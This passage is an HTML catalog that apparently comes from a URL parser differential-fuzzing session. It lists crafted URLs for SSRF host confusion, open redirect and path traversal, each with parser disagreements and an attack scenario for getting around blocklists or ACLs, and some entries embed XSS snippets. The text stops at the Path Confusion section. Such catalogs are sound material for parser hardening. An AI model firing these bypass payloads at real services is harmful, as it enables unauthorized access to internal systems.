@@ -1,0 +1,1207 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>URL Parser Payload Catalog — S57</title>
+<style>
+  :root {
+    --bg: #0d1117; --surface: #161b22; --border: #30363d;
+    --text: #e6edf3; --muted: #8b949e; --accent: #58a6ff;
+    --red: #f85149; --orange: #d29922; --green: #3fb950; --purple: #bc8cff;
+    --cyan: #39d2c0; --pink: #f778ba;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: var(--bg); color: var(--text); font-family: -apple-system, 'Segoe UI', sans-serif; line-height: 1.6; padding: 2rem; max-width: 1200px; margin: 0 auto; }
+  h1 { font-size: 2rem; margin-bottom: 0.5rem; background: linear-gradient(135deg, var(--red), var(--orange), var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+  .subtitle { color: var(--muted); font-size: 0.9rem; margin-bottom: 2rem; }
+  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 1.5rem; margin: 1rem 0; }
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .grid-5 { display: grid; grid-template-columns: repeat(5, 1fr); gap: 0.75rem; }
+  @media (max-width: 900px) { .grid-2, .grid-5 { grid-template-columns: 1fr 1fr; } }
+  @media (max-width: 500px) { .grid-5 { grid-template-columns: 1fr; } }
+
+  /* Stat cards */
+  .stat-card { text-align: center; padding: 1.2rem 0.5rem; }
+  .stat-value { font-size: 2rem; font-weight: 700; }
+  .stat-label { color: var(--muted); font-size: 0.8rem; margin-top: 0.25rem; }
+
+  /* Category sections */
+  .cat-header { display: flex; align-items: center; gap: 1rem; margin: 3rem 0 0.5rem; padding-bottom: 0.75rem; border-bottom: 2px solid var(--border); cursor: pointer; user-select: none; }
+  .cat-header:hover { border-bottom-color: var(--accent); }
+  .cat-icon { font-size: 1.6rem; width: 2.2rem; text-align: center; }
+  .cat-title { font-size: 1.3rem; font-weight: 700; flex: 1; }
+  .cat-count { font-size: 0.85rem; font-weight: 600; padding: 0.2rem 0.75rem; border-radius: 99px; }
+  .cat-toggle { color: var(--muted); font-size: 0.9rem; transition: transform 0.2s; }
+  .cat-toggle.open { transform: rotate(90deg); }
+  .cat-body { overflow: hidden; transition: max-height 0.4s ease; }
+  .cat-desc { color: var(--muted); font-size: 0.9rem; margin: 0.5rem 0 1rem; }
+
+  /* Payload cards */
+  .payload-card { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; margin: 0.75rem 0; overflow: hidden; }
+  .payload-title { padding: 0.75rem 1rem; font-weight: 600; font-size: 0.95rem; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 0.5rem; cursor: pointer; }
+  .payload-title:hover { background: rgba(88,166,255,0.04); }
+  .payload-body { padding: 0 1rem 1rem; }
+  .payload-input { background: #0d1117; border: 1px solid var(--border); border-radius: 8px; padding: 0.75rem 1rem; margin: 0.75rem 0; font-family: 'Cascadia Code', 'Fira Code', monospace; font-size: 0.85rem; overflow-x: auto; white-space: pre; color: var(--cyan); }
+
+  /* Parser comparison table */
+  .cmp-table { width: 100%; border-collapse: collapse; font-size: 0.85rem; margin: 0.5rem 0; }
+  .cmp-table th { text-align: left; padding: 0.5rem 0.75rem; color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: 0.7rem; letter-spacing: 0.05em; border-bottom: 2px solid var(--border); }
+  .cmp-table td { padding: 0.5rem 0.75rem; border-bottom: 1px solid var(--border); font-family: 'Cascadia Code', 'Fira Code', monospace; font-size: 0.82rem; }
+  .cmp-table tr:hover td { background: rgba(88,166,255,0.04); }
+  .parser-name { font-weight: 700; color: var(--accent); font-family: -apple-system, 'Segoe UI', sans-serif; white-space: nowrap; }
+  .parser-whatwg { color: var(--purple); }
+  .parser-legacy { color: var(--orange); }
+  .parser-rfc { color: var(--green); }
+  .parser-curl { color: var(--pink); }
+
+  /* Attack scenario box */
+  .attack-box { border-left: 3px solid var(--red); padding: 0.6rem 1rem; margin: 0.75rem 0; background: rgba(248,81,73,0.05); border-radius: 0 6px 6px 0; font-size: 0.85rem; }
+  .attack-label { color: var(--red); font-weight: 700; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 0.25rem; }
+
+  /* Severity badges */
+  .badge { display: inline-block; padding: 0.15rem 0.6rem; border-radius: 99px; font-size: 0.72rem; font-weight: 700; letter-spacing: 0.03em; }
+  .badge-crit { background: rgba(248,81,73,0.15); color: var(--red); border: 1px solid rgba(248,81,73,0.3); }
+  .badge-high { background: rgba(210,153,34,0.15); color: var(--orange); border: 1px solid rgba(210,153,34,0.3); }
+  .badge-med { background: rgba(88,166,255,0.15); color: var(--accent); border: 1px solid rgba(88,166,255,0.3); }
+  .badge-low { background: rgba(139,148,158,0.15); color: var(--muted); border: 1px solid rgba(139,148,158,0.3); }
+
+  /* More variants block */
+  .more-variants { background: #0d1117; border: 1px solid var(--border); border-radius: 8px; padding: 1rem; margin: 0.75rem 0; font-family: 'Cascadia Code', 'Fira Code', monospace; font-size: 0.8rem; line-height: 1.7; overflow-x: auto; }
+  .more-variants .mv-input { color: var(--cyan); }
+  .more-variants .mv-detail { color: var(--muted); padding-left: 1.5rem; }
+
+  /* Summary table */
+  .summary-table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
+  .summary-table th { text-align: left; padding: 0.75rem; color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 0.05em; border-bottom: 2px solid var(--border); }
+  .summary-table td { padding: 0.75rem; border-bottom: 1px solid var(--border); }
+  .summary-table tr:hover td { background: rgba(88,166,255,0.04); }
+  .summary-table tr:last-child td { font-weight: 700; border-top: 2px solid var(--border); }
+
+  /* Bar chart */
+  .hbar { display: flex; align-items: center; gap: 0.5rem; margin: 0.3rem 0; }
+  .hbar-label { font-size: 0.8rem; width: 140px; text-align: right; color: var(--muted); }
+  .hbar-track { flex: 1; height: 22px; background: rgba(110,118,129,0.1); border-radius: 4px; overflow: hidden; position: relative; }
+  .hbar-fill { height: 100%; border-radius: 4px; display: flex; align-items: center; padding-left: 8px; font-size: 0.72rem; font-weight: 700; color: #fff; min-width: 28px; transition: width 0.5s ease; }
+  .hbar-value { font-size: 0.8rem; width: 40px; font-weight: 600; }
+
+  /* TOC */
+  .toc { display: flex; flex-wrap: wrap; gap: 0.5rem; margin: 1rem 0 2rem; }
+  .toc a { padding: 0.4rem 0.8rem; border-radius: 8px; background: var(--surface); border: 1px solid var(--border); color: var(--text); text-decoration: none; font-size: 0.82rem; font-weight: 500; transition: all 0.2s; }
+  .toc a:hover { border-color: var(--accent); color: var(--accent); }
+
+  /* Footer */
+  .footer { margin-top: 4rem; padding-top: 2rem; border-top: 1px solid var(--border); color: var(--muted); font-size: 0.8rem; text-align: center; }
+</style>
+</head>
+<body>
+
+<h1>URL Parser Payload Catalog</h1>
+<p class="subtitle">Session S57 (Multi-finding Oracle) &bull; 553 unique findings &bull; 2026-02-23<br>
+Parsers: <code style="color:var(--accent)">urllib</code> (primary) vs
+<code style="color:var(--purple)">WHATWG</code>
+<code style="color:var(--orange)">legacy</code>
+<code style="color:var(--green)">rfc3986</code>
+<code style="color:var(--pink)">curl</code></p>
+
+<!-- Hero stats -->
+<div class="grid-5">
+  <div class="card stat-card"><div class="stat-value" style="color:var(--red)">35</div><div class="stat-label">CRITICAL</div></div>
+  <div class="card stat-card"><div class="stat-value" style="color:var(--orange)">193</div><div class="stat-label">HIGH</div></div>
+  <div class="card stat-card"><div class="stat-value" style="color:var(--accent)">291</div><div class="stat-label">MEDIUM</div></div>
+  <div class="card stat-card"><div class="stat-value" style="color:var(--muted)">34</div><div class="stat-label">LOW</div></div>
+  <div class="card stat-card"><div class="stat-value" style="color:var(--cyan)">553</div><div class="stat-label">TOTAL</div></div>
+</div>
+
+<!-- Distribution chart -->
+<div class="card" style="margin-top:1.5rem">
+  <h3 style="font-size:1rem;margin-bottom:1rem;color:var(--muted)">Findings by Category</h3>
+  <div class="hbar"><span class="hbar-label">Open Redirect</span><div class="hbar-track"><div class="hbar-fill" style="width:54%;background:var(--orange)">74</div></div></div>
+  <div class="hbar"><span class="hbar-label">Path Traversal</span><div class="hbar-track"><div class="hbar-fill" style="width:47%;background:var(--orange)">65</div></div></div>
+  <div class="hbar"><span class="hbar-label">Path Confusion</span><div class="hbar-track"><div class="hbar-fill" style="width:33%;background:var(--accent)">45</div></div></div>
+  <div class="hbar"><span class="hbar-label">Fragment Confusion</span><div class="hbar-track"><div class="hbar-fill" style="width:26%;background:var(--muted)">36</div></div></div>
+  <div class="hbar"><span class="hbar-label">SSRF Host Confusion</span><div class="hbar-track"><div class="hbar-fill" style="width:25%;background:var(--red)">35</div></div></div>
+  <div class="hbar"><span class="hbar-label">Port Confusion</span><div class="hbar-track"><div class="hbar-fill" style="width:25%;background:var(--accent)">34</div></div></div>
+  <div class="hbar"><span class="hbar-label">Authority Confusion</span><div class="hbar-track"><div class="hbar-fill" style="width:23%;background:var(--orange)">31</div></div></div>
+  <div class="hbar"><span class="hbar-label">Query Confusion</span><div class="hbar-track"><div class="hbar-fill" style="width:20%;background:var(--accent)">27</div></div></div>
+  <div class="hbar"><span class="hbar-label">Scheme Confusion</span><div class="hbar-track"><div class="hbar-fill" style="width:9%;background:var(--orange)">13</div></div></div>
+  <div class="hbar"><span class="hbar-label">SSRF Accept/Reject</span><div class="hbar-track"><div class="hbar-fill" style="width:4%;background:var(--orange)">6</div></div></div>
+  <div class="hbar"><span class="hbar-label" style="color:var(--muted);font-style:italic">Uncategorized</span><div class="hbar-track"><div class="hbar-fill" style="width:100%;background:rgba(110,118,129,0.3)">187</div></div></div>
+</div>
+
+<!-- TOC -->
+<div class="toc">
+  <a href="#cat-ssrf">SSRF Host Confusion</a>
+  <a href="#cat-redirect">Open Redirect</a>
+  <a href="#cat-traversal">Path Traversal</a>
+  <a href="#cat-pathconf">Path Confusion</a>
+  <a href="#cat-fragment">Fragment Confusion</a>
+  <a href="#cat-port">Port Confusion</a>
+  <a href="#cat-authority">Authority Confusion</a>
+  <a href="#cat-query">Query Confusion</a>
+  <a href="#cat-scheme">Scheme Confusion</a>
+  <a href="#cat-accept">SSRF Accept/Reject</a>
+</div>
+
+
+<!-- ======================= 1. SSRF HOST CONFUSION ======================= -->
+<div id="cat-ssrf" class="cat-header" onclick="toggleCat(this)">
+  <span class="cat-icon">&#x1f6a8;</span>
+  <span class="cat-title">1. SSRF Host Confusion</span>
+  <span class="badge badge-crit">CRITICAL</span>
+  <span class="cat-count badge-crit" style="background:rgba(248,81,73,0.15);color:var(--red);border:1px solid rgba(248,81,73,0.3)">35 findings</span>
+  <span class="cat-toggle open">&#9654;</span>
+</div>
+<div class="cat-body" style="max-height:none">
+  <p class="cat-desc">Parser A sees an external host, Parser B resolves to an internal IP. <strong>Direct SSRF bypass.</strong></p>
+
+  <!-- 1.1 -->
+  <div class="payload-card">
+    <div class="payload-title">1.1 Percent-Encoded Localhost</div>
+    <div class="payload-body">
+      <div class="payload-input">http://%6c%6f%63%61%6c%68%6f%73%74/admin</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>%6c%6f%63%61%6c%68%6f%73%74</code> (encoded, opaque)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>localhost</code> (decoded &rarr; internal IP)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        urllib validates SSRF blocklist &rarr; passes (doesn't match "localhost"). WHATWG/browser fetches &rarr; resolves to 127.0.0.1.
+      </div>
+    </div>
+  </div>
+
+  <!-- 1.2 -->
+  <div class="payload-card">
+    <div class="payload-title">1.2 Hex IP with Percent-Encoded Dots</div>
+    <div class="payload-body">
+      <div class="payload-input">http://0x7f%2e0%2e0%2e1/%2e%2e</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>0x7f%2e0%2e0%2e1</code> (opaque string)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>127.0.0.1</code> (decoded + hex normalized)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        Double bypass: encoding + hex IP. Extremely hard for WAF detection.
+      </div>
+    </div>
+  </div>
+
+  <!-- 1.3 -->
+  <div class="payload-card">
+    <div class="payload-title">1.3 Double-Bracket IPv6</div>
+    <div class="payload-body">
+      <div class="payload-input">http://[[::1]]/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>[::1</code> (first <code>]</code> terminates &mdash; invalid)</td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>[::1]</code> (correct IPv6 loopback)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        Blocklist doesn't contain <code>[::1</code>. Legacy parser resolves to loopback.
+      </div>
+    </div>
+  </div>
+
+  <!-- 1.4 -->
+  <div class="payload-card">
+    <div class="payload-title">1.4 Octal IP + Scheme Confusion</div>
+    <div class="payload-body">
+      <div class="payload-input">telnet://0177000000javascript:rz[1]=niknyofwdj%E0%80%AFc%23//fulxnauf.com.br/..%c0%af</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>1</code> (parsing confusion)</td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>0177000000javascript</code> &rarr; octal normalize &rarr; <code>127.0.0.1</code></td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        Triple bypass: non-HTTP scheme + octal IP + path traversal.
+      </div>
+    </div>
+  </div>
+
+  <!-- 1.5 -->
+  <div class="payload-card">
+    <div class="payload-title">1.5 Backslash + IPv6-Mapped</div>
+    <div class="payload-body">
+      <div class="payload-input">http://evil.com\&#x200c;od.[::ffff:7f00:1]com/path&#xFF0F;</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>::ffff:7f00:1</code> (IPv6-mapped 127.0.0.1)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>evil.com</code> (backslash = path separator)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        Reversed direction &mdash; urllib resolves to internal, WHATWG to external. IPv6-mapped IPv4 format.
+      </div>
+    </div>
+  </div>
+
+  <!-- 1.6 -->
+  <div class="payload-card">
+    <div class="payload-title">1.6 NULL Byte Host Truncation</div>
+    <div class="payload-body">
+      <div class="payload-input">http://good.com%00.evil.com/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>good.com%00.evil.com</code> (full string)</td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>good.com</code> (truncated at NULL)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        If <code>good.com</code> is allowlisted, urllib passes validation. Legacy execution connects to <code>good.com</code> only.
+      </div>
+    </div>
+  </div>
+
+  <!-- 1.7 -->
+  <div class="payload-card">
+    <div class="payload-title">1.7 Incomplete IP Auto-Completion</div>
+    <div class="payload-body">
+      <div class="payload-input">http://127.0/.0.1#@evil.com</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>127.0</code> (incomplete)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>127.0.0.0</code> (auto-completed)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        Auto-completed to 0.0.0.0 range. Blocklist doesn't contain <code>127.0</code>.
+      </div>
+    </div>
+  </div>
+
+  <!-- 1.8 -->
+  <div class="payload-card">
+    <div class="payload-title">1.8 Localhost Unicode Escape</div>
+    <div class="payload-body">
+      <div class="payload-input">http://localhos\u0074/admin</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>localhos\u0074</code> (escape uninterpreted)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>localhos</code> (truncated at backslash)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- 1.9 -->
+  <div class="payload-card">
+    <div class="payload-title">1.9 Bracket + Hex IP</div>
+    <div class="payload-body">
+      <div class="payload-input">http://0x#%40127&lt;http://[::1]math&gt;&lt;annotation-xm</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>0x</code></td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>0.0.0.0</code> (hex 0 &rarr; 0.0.0.0)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <!-- 1.10 -->
+  <div class="payload-card">
+    <div class="payload-title">1.10 Telnet Backslash Authority</div>
+    <div class="payload-body">
+      <div class="payload-input">telnet://localhost:\@jth.co.uk/..%c0%af</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>jth.co.uk</code> (post-backslash = host)</td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>localhost</code> (backslash = path separator)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        Non-HTTP scheme SSRF filter bypass.
+      </div>
+    </div>
+  </div>
+
+  <!-- More variants -->
+  <div class="payload-card">
+    <div class="payload-title" onclick="togglePayload(this)" style="cursor:pointer">
+      <span>&#x2795;</span> More SSRF Variants
+    </div>
+    <div class="payload-body" style="display:none">
+      <div class="more-variants">
+<span class="mv-input">resource://bwr.co.kr\@127.0.0.1/xqo;</span>
+<span class="mv-detail">urllib: host="127.0.0.1" | legacy: host="bwr.co.kr"</span>
+
+<span class="mv-input">moz-extension://[[127.0.0.1]]:080/..;</span>
+<span class="mv-detail">urllib: host="[127.0.0.1" | legacy: host="[127.0.0.1]"</span>
+
+<span class="mv-input">blob://[0000:0000:0000:0000:0000:0000:0000:0001]t0001]/tte.xte.xml</span>
+<span class="mv-detail">urllib: host="0000:...:0001" | legacy: host="0000:...:0001]t0001"</span>
+
+<span class="mv-input">javascript://127.0.0.1%00.[xqlcrqtoh.com]/fbfytyspv;.css</span>
+<span class="mv-detail">urllib: host="xqlcrqtoh.com" | rfc3986: host="127.0.0.1%00.[xqlcrqtoh.com]"</span>
+
+<span class="mv-input">http://a%..\40b@127.0.0.1/..;</span>
+<span class="mv-detail">urllib: host="127.0.0.1" | legacy: host="a"</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ======================= 2. OPEN REDIRECT ======================= -->
+<div id="cat-redirect" class="cat-header" onclick="toggleCat(this)">
+  <span class="cat-icon">&#x21AA;</span>
+  <span class="cat-title">2. Open Redirect</span>
+  <span class="badge badge-high">HIGH</span>
+  <span class="cat-count" style="background:rgba(210,153,34,0.15);color:var(--orange);border:1px solid rgba(210,153,34,0.3)">74 findings</span>
+  <span class="cat-toggle open">&#9654;</span>
+</div>
+<div class="cat-body" style="max-height:none">
+  <p class="cat-desc">Host interpretation differs between parsers, enabling redirect to attacker domain.</p>
+
+  <div class="payload-card">
+    <div class="payload-title">2.1 Backslash Authority (canonical vector)</div>
+    <div class="payload-body">
+      <div class="payload-input">http://evil.com\@good.com/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>good.com</code> (backslash &rarr; userinfo separator)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>evil.com</code> (backslash &rarr; <code>/</code>)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        urllib validation = good.com (safe) &rarr; WHATWG fetch = evil.com (attacker-controlled)
+      </div>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">2.2 NULL Byte + HTML Injection</div>
+    <div class="payload-body">
+      <div class="payload-input">http://good.com%00.evil.com:80//&lt;a id="x" name="y" href="javascript:alert(1)"&gt;</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>good.com%00.evil.com</code></td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>good.com</code> (NULL truncation)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">2.3 Fullwidth Dot (Unicode)</div>
+    <div class="payload-body">
+      <div class="payload-input">http://evil&#x3002;com/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>evil&#x3002;com</code> (fullwidth dot preserved)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>evil.com</code> (Unicode normalized)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">2.4 Hex IP Normalization</div>
+    <div class="payload-body">
+      <div class="payload-input">HTTP://0x7f000001/%2e%2e/.%00.</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>0x7f000001</code></td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>127.0.0.1</code></td></tr>
+      </table>
+      <div class="payload-input">//0x7f.0x0.0x0.0x1:00443/path#fragment</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>0x7f.0x0.0x0.0x1</code></td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>127.0.0.1</code></td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">2.5 Octal IP Partial</div>
+    <div class="payload-body">
+      <div class="payload-input">http://017#:800 .1/admin</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>017</code></td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>0.0.0.15</code> (octal 017 = 15)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">2.6 Tab/CR/LF in Host</div>
+    <div class="payload-body">
+      <div class="payload-input">http://ev\til.c\r\nom/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>evil.com</code> (control chars stripped)</td></tr>
+        <tr><td class="parser-name parser-rfc">rfc3986</td><td><code>ev\til.c\r\nom</code> (control chars preserved)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">2.7 IPv6 Bracket Mismatch</div>
+    <div class="payload-body">
+      <div class="payload-input">http://[::1]:80/admin</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>::1</code> (brackets removed)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>[::1]</code> (brackets preserved)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title" onclick="togglePayload(this)" style="cursor:pointer">
+      <span>&#x2795;</span> More Open Redirect Variants
+    </div>
+    <div class="payload-body" style="display:none">
+      <div class="more-variants">
+<span class="mv-input">http://evil.com\@go?#od.com/path</span>
+<span class="mv-detail">urllib: host="go" | WHATWG: host="evil.com"</span>
+
+<span class="mv-input">http://evil.com\@go?key=val;extraod.com/path</span>
+<span class="mv-detail">urllib: host="go" | WHATWG: host="evil.com"</span>
+
+<span class="mv-input">htp://evil.com\@good.com/path</span>
+<span class="mv-detail">urllib: host="good.com" | legacy: host="evil.com"</span>
+
+<span class="mv-input">http://good.&lt;ma?key=%26extra=1th&gt;&lt;mo&gt;com:0x50/path</span>
+<span class="mv-detail">urllib: host="good.&lt;ma" | legacy: host="good."</span>
+
+<span class="mv-input">http://good.com&lt;svg/onload=alert(1)&gt;%00.evil.com:80//...</span>
+<span class="mv-detail">urllib: host="good.com&lt;svg" | legacy: host="good.com"</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ======================= 3. PATH TRAVERSAL ======================= -->
+<div id="cat-traversal" class="cat-header" onclick="toggleCat(this)">
+  <span class="cat-icon">&#x1f4c2;</span>
+  <span class="cat-title">3. Path Traversal</span>
+  <span class="badge badge-high">HIGH</span>
+  <span class="cat-count" style="background:rgba(210,153,34,0.15);color:var(--orange);border:1px solid rgba(210,153,34,0.3)">65 findings</span>
+  <span class="cat-toggle open">&#9654;</span>
+</div>
+<div class="cat-body" style="max-height:none">
+  <p class="cat-desc">Differences in <code>..</code> normalization enable directory escape.</p>
+
+  <div class="payload-card">
+    <div class="payload-title">3.1 Backslash Path Traversal</div>
+    <div class="payload-body">
+      <div class="payload-input">http://good.com/..\..\evil.com</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Path</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>/..\..\evil.com</code> (backslash preserved)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>/evil.com</code> (backslash&rarr;slash, <code>..</code> normalized)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        nginx (urllib-based) &rarr; Node.js (WHATWG) proxy: path ACL bypass.
+      </div>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">3.2 Semicolon Path Parameter</div>
+    <div class="payload-body">
+      <div class="payload-input">http://127.0.0.256/..;alozbllxb[8]=%20=null</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Path</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>/..</code> (truncated at <code>;</code>)</td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>/..;alozbllxb[8]=%20=null</code> (preserved)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        Java Servlet/Tomcat path parameter (<code>;jsessionid=...</code>) handling difference.
+      </div>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">3.3 Double Percent-Encoding</div>
+    <div class="payload-body">
+      <div class="payload-input">content://[vf.zvdfxkscl]/admin;/../secret/..%2fbtwaa%GGfb</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Path</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>/admin;/../secret/..%2fbtwaa%GGfb</code></td></tr>
+        <tr><td class="parser-name parser-rfc">rfc3986</td><td><code>/admin;/../secret/..%252fbtwaa%25GGfb</code> (re-encoded)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">3.4 Percent-Encoded Dot Traversal</div>
+    <div class="payload-body">
+      <div class="payload-input">kgdy://[::1]:@localhost./%2e%2e</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Path</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>/%2e%2e</code> (not decoded &mdash; no traversal)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>/</code> (decoded + <code>..</code> normalized to root)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">3.5 UTF-8 Overlong Dot</div>
+    <div class="payload-body">
+      <div class="payload-input">%0ahttp://localhost/..%e0%80%af</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Path</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>%0ahttp://localhost/..%e0%80%af</code> (entire string = path)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>/%0ahttp://localhost/..%e0%80%af</code></td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title" onclick="togglePayload(this)" style="cursor:pointer">
+      <span>&#x2795;</span> More Path Traversal Variants
+    </div>
+    <div class="payload-body" style="display:none">
+      <div class="more-variants">
+<span class="mv-input">http:/dmin;/../secret/apuccglbs.xml</span>
+<span class="mv-detail">urllib: path="/dmin;/../secret/..." | WHATWG: path="/secret/..." (normalized)</span>
+
+<span class="mv-input">//hwwqyl.co.jp/..;</span>
+<span class="mv-detail">urllib: path="/.." | WHATWG: path="/..;"</span>
+
+<span class="mv-input">about://[v1...]:0/..%efile://0%80%:65536af</span>
+<span class="mv-detail">urllib: path="/..%efile://0%80%:65536af" | rfc3986: path="/..%25efile://0%2580%25:65536af"</span>
+
+<span class="mv-input">9blob:/&amp;quot;/[:9999/.*1&gt;:99999/..%ef%bc%8f</span>
+<span class="mv-detail">urllib: path="/&amp;quot;/..." | rfc3986: path="9blob:/&amp;quot;/..."</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ======================= 4. PATH CONFUSION ======================= -->
+<div id="cat-pathconf" class="cat-header" onclick="toggleCat(this)">
+  <span class="cat-icon">&#x1f500;</span>
+  <span class="cat-title">4. Path Confusion</span>
+  <span class="badge badge-med">MEDIUM</span>
+  <span class="cat-count" style="background:rgba(88,166,255,0.15);color:var(--accent);border:1px solid rgba(88,166,255,0.3)">45 findings</span>
+  <span class="cat-toggle open">&#9654;</span>
+</div>
+<div class="cat-body" style="max-height:none">
+  <p class="cat-desc">Path interpretation differences (not <code>..</code> normalization).</p>
+
+  <div class="payload-card">
